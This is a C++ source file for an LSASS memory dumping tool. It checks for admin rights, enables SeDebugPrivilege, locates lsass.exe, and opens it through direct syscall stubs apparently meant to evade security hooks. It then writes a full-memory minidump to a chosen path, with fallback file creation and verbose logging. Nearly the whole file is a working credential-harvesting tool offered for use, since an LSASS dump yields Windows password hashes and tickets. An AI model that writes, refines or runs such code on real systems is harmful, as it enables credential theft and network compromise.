// LsassDumpSyscall.cpp (patched, forgiving + verbose logging)
#include "syscall.h"
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <tchar.h>
#include <string>
#include <sstream>
#include <time.h>
#include <fstream>
#include <codecvt>

#pragma comment(lib, "Dbghelp.lib")

using namespace std;

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

void InitializeSystemCalls() {
    g_ZwOpenProcess = ZwOpenProcess10;
    g_ZwClose = ZwClose10;
    g_ZwWriteVirtualMemory = ZwWriteVirtualMemory10;
    g_ZwProtectVirtualMemory = ZwProtectVirtualMemory10;
    g_ZwQuerySystemInformation = ZwQuerySystemInformation10;
    g_NtCreateFile = NtCreateFile10;
}

// helper to obtain a UTF-8 log filename in %TEMP%
static std::wstring MakeLogPath(DWORD pid)
{
    wchar_t tempPath[MAX_PATH] = { 0 };
    if (GetTempPathW(MAX_PATH, tempPath) == 0)
    {
        // fallback to current dir
        std::wstringstream ss;
        ss << L"lsassdump_" << pid << L".log";
        return ss.str();
    }
    // timestamp
    time_t t = time(NULL);
    struct tm tmBuf;
    localtime_s(&tmBuf, &t);
    wchar_t timebuf[64];
    wcsftime(timebuf, _countof(timebuf), L"%Y%m%d_%H%M%S", &tmBuf);

    std::wstringstream ss;
    ss << tempPath;
    // ensure trailing backslash
    size_t len = ss.str().length();
    std::wstring base = ss.str();
    if (!base.empty() && base.back() != L'\\' && base.back() != L'/') ss << L"\\";
    ss << L"lsassdump_" << pid << L"_" << timebuf << L".log";
    return ss.str();
}

// thread-safe append-to-file routine (UTF-8)
static void LogToFileW(const std::wstring& path, const std::wstring& msg)
{
    HANDLE h = CreateFileW(path.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    // convert UTF-16 msg to UTF-8
    int needed = WideCharToMultiByte(CP_UTF8, 0, msg.c_str(), -1, NULL, 0, NULL, NULL);
    if (needed > 0)
    {
        std::string buf; buf.resize(needed);
        WideCharToMultiByte(CP_UTF8, 0, msg.c_str(), -1, &buf[0], needed, NULL, NULL);
        // write without the trailing null
        DWORD written = 0;
        WriteFile(h, buf.c_str(), (DWORD)strlen(buf.c_str()), &written, NULL);
    }
    CloseHandle(h);
}

// convenience that logs both to stdout (if any) and to file
static void LogBoth(const std::wstring& logfile, const std::wstring& msg)
{
    // write to console if available
    std::wcout << msg << std::endl;
    // append to file
    LogToFileW(logfile, msg + L"\r\n");
}

bool IsElevated() {
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            CloseHandle(hToken);
            return elevation.TokenIsElevated != 0;
        }
        CloseHandle(hToken);
    }
    return false;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                BOOL ok = (GetLastError() == ERROR_SUCCESS);
                CloseHandle(hToken);
                return ok;
            }
        }
        CloseHandle(hToken);
    }
    return false;
}

DWORD GetLsassPID() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_tcsicmp(pe.szExeFile, _T("lsass.exe")) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

// Helper: format last error message (wide)
static std::wstring FormatLastErrorW(DWORD err)
{
    if (err == 0) return L"(no error)";
    LPWSTR buf = NULL;
    DWORD len = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&buf, 0, NULL);
    std::wstring msg;
    if (len && buf) {
        msg.assign(buf, len);
        // trim trailing CRLF
        while (!msg.empty() && (msg.back() == L'\r' || msg.back() == L'\n')) msg.pop_back();
        LocalFree(buf);
    }
    else {
        std::wstringstream ss; ss << L"(error " << err << L")";
        msg = ss.str();
    }
    return msg;
}

// Create file with multiple attempts and detailed logging.
// Returns handle (INVALID_HANDLE_VALUE on failure) and optionally sets outPathUsed.
static HANDLE TryCreateDumpFile(const std::wstring& desiredPath, std::wstring& outPathUsed, const std::wstring& logPath)
{
    // Try to resolve full path first
    wchar_t full[MAX_PATH] = { 0 };
    if (GetFullPathNameW(desiredPath.c_str(), MAX_PATH, full, NULL) == 0)
    {
        LogBoth(logPath, L"[dumper] GetFullPathNameW failed for: " + desiredPath);
        outPathUsed = desiredPath;
    }
    else
    {
        outPathUsed = full;
    }

    // Primary attempt: CREATE_ALWAYS with no sharing (same as original)
    HANDLE hFile = CreateFileW(outPathUsed.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        LogBoth(logPath, L"[dumper] Created dump file: " + outPathUsed);
        return hFile;
    }

    DWORD err = GetLastError();
    LogBoth(logPath, L"[dumper] CreateFile (CREATE_ALWAYS) failed for: " + outPathUsed + L" -> " + std::to_wstring(err) + L" - " + FormatLastErrorW(err));

    // If file exists, try OPEN_EXISTING with share flags - sometimes a pre-created file can be opened
    if (GetFileAttributesW(outPathUsed.c_str()) != INVALID_FILE_ATTRIBUTES)
    {
        LogBoth(logPath, L"[dumper] File exists; trying OPEN_EXISTING + GENERIC_WRITE + FILE_SHARE_READ|WRITE");
        hFile = CreateFileW(outPathUsed.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            LogBoth(logPath, L"[dumper] Opened existing file for writing: " + outPathUsed);
            return hFile;
        }
        DWORD err2 = GetLastError();
        LogBoth(logPath, L"[dumper] OPEN_EXISTING failed: " + std::to_wstring(err2) + L" - " + FormatLastErrorW(err2));
    }

    // As a forgiving fallback, create a temp file in %TEMP%
    wchar_t tempPath[MAX_PATH] = { 0 };
    DWORD tlen = GetTempPathW(MAX_PATH, tempPath);
    if (tlen == 0 || tlen > MAX_PATH) {
        LogBoth(logPath, L"[dumper] GetTempPathW failed or too long");
    }
    else {
        wchar_t tempFile[MAX_PATH] = { 0 };
        if (GetTempFileNameW(tempPath, L"lsd", 0, tempFile) != 0)
        {
            LogBoth(logPath, L"[dumper] Falling back to temp file: " + std::wstring(tempFile));
            HANDLE hTemp = CreateFileW(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hTemp != INVALID_HANDLE_VALUE)
            {
                outPathUsed = tempFile;
                return hTemp;
            }
            DWORD err3 = GetLastError();
            LogBoth(logPath, L"[dumper] CreateFile for temp fallback failed: " + std::to_wstring(err3) + L" - " + FormatLastErrorW(err3));
        }
        else {
            LogBoth(logPath, L"[dumper] GetTempFileNameW failed to generate name");
        }
    }

    // Final attempt: try to open desired path with GENERIC_READ to at least prove existence
    HANDLE hProbe = CreateFileW(outPathUsed.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hProbe != INVALID_HANDLE_VALUE)
    {
        LogBoth(logPath, L"[dumper] Probe open succeeded (read-only) for: " + outPathUsed + L" - will not be able to write");
        CloseHandle(hProbe);
    }
    return INVALID_HANDLE_VALUE;
}

bool CreateMiniDump(HANDLE processHandle, DWORD processId, LPCWSTR dumpPath, std::wstring& usedPath, const std::wstring& logPath)
{
    usedPath.clear();

    HANDLE hFile = TryCreateDumpFile(dumpPath ? std::wstring(dumpPath) : std::wstring(), usedPath, logPath);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        LogBoth(logPath, L"[dumper] All CreateFile attempts failed. Will still attempt to open lsass to report exact failure.");
    }

    HANDLE hLsass = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(processId)), nullptr };
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = g_ZwOpenProcess(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);
    if (status != STATUS_SUCCESS)
    {
        LogBoth(logPath, L"[dumper] Failed to open lsass.exe with error: 0x" + std::to_wstring(status));
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
        return false;
    }

    if (hFile == INVALID_HANDLE_VALUE)
    {
        LogBoth(logPath, L"[dumper] No writable file handle available - cannot call MiniDumpWriteDump. Cleaning up and returning error.");
        g_ZwClose(hLsass);
        return false;
    }

    BOOL success = MiniDumpWriteDump(hLsass, processId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (!success)
    {
        DWORD mdErr = GetLastError();
        LogBoth(logPath, L"[dumper] MiniDumpWriteDump failed: " + std::to_wstring(mdErr) + L" - " + FormatLastErrorW(mdErr));
        CloseHandle(hFile);
        g_ZwClose(hLsass);
        return false;
    }

    CloseHandle(hFile);
    g_ZwClose(hLsass);
    LogBoth(logPath, L"[dumper] Dump created successfully at: " + usedPath);
    return true;
}


int wmain(int argc, wchar_t* argv[]) {
    InitializeSystemCalls();

    std::wstring logPath = MakeLogPath(GetCurrentProcessId());
    
    if (argc != 2) {
        LogBoth(logPath, L"Usage: " + std::wstring(argv[0]) + L" <output_path>");
        LogBoth(logPath, L"Example: " + std::wstring(argv[0]) + L" C:\\temp\\lsass.dmp");
        return 1;
    }

    if (!IsElevated()) {
        LogBoth(logPath, L"You need elevated privileges to run this tool!");
        return 1;
    }

    if (!EnableDebugPrivilege()) {
        LogBoth(logPath, L"Failed to enable debug privilege! (continuing anyway)");
    }
    else {
        LogBoth(logPath, L"[dumper] SeDebugPrivilege enabled.");
    }

    DWORD lsassPID = GetLsassPID();
    if (lsassPID == 0) {
        LogBoth(logPath, L"Failed to find lsass.exe.");
        return 1;
    }

    LogBoth(logPath, L"[dumper] LOG START");
    LogBoth(logPath, L"[dumper] Command-line dump path: " + std::wstring(argv[1]));

    HANDLE hLsass = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(lsassPID)), nullptr };
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = g_ZwOpenProcess(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);
    if (status != STATUS_SUCCESS) {
        LogBoth(logPath, L"Failed to open lsass.exe with error: 0x" + std::to_wstring(status));
        LogBoth(logPath, L"Note: If LSASS is protected (PPL), OpenProcess may be denied even for elevated tokens.");
        return 1;
    }

    g_ZwClose(hLsass);

    std::wstring used;
    bool ok = CreateMiniDump(NULL, lsassPID, argv[1], used, logPath);
    if (!ok) {
        LogBoth(logPath, L"[dumper] CreateMiniDump failed for requested path. Exiting with error.");
        return 1;
    }

    LogBoth(logPath, L"[dumper] Completed successfully. File: " + used);
    return 0;
}
